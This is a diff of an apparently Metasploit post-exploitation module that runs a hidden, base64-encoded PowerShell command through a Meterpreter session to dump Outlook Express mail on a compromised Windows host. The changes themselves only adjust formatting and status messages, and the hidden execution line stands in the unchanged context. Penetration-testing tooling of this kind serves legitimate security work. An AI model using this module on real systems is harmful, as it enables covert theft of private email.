@@ -13,15 +13,15 @@ class Metasploit3 < Msf::Post
           Meterpreter script for utilizing PowerShell to extract mails from from Outlook Express.
         },
         'License'       => MSF_LICENSE,
-        'Author'        => [ 'Roni Bachar' ],
-        'Platform'      => [ 'win' ],
-        'SessionTypes'  => [ 'meterpreter' ]
+        'Author'        => 'Roni Bachar',
+        'Platform'      => 'win' ,
+        'SessionTypes'  => 'meterpreter'
     ))
  register_options(
       [
         OptString.new('FOLDER', [true, 'Folder to Extract(6-Inbox,5-Sent Items,3-Deleted Items)', 6]),
         OptString.new('COUNT', [true, 'Count of mails to extract', 10]),
-        OptString.new('FILENAME', [true, 'Filename to save in temp', 'pmail.txt'])
+        OptString.new('FILENAME', [true, 'Filename to save in temp folder', 'pmail.txt'])
 
       ], self.class)
 end
@@ -56,7 +56,7 @@ end
   #print_status("powershell -wind hidden -noni -enc "+b64)
   session.sys.process.execute("cmd /c powershell -WindowStyle hidden -enc "+b64, nil, {'Hidden' => 'true', 'Channelized' => true})
   print_status('Dumping Mails...')
-  print_status('Please wait a few minutes before downloading')
+  print_status('Please wait a few minutes before downloading from temp folder')
   end
 end
 
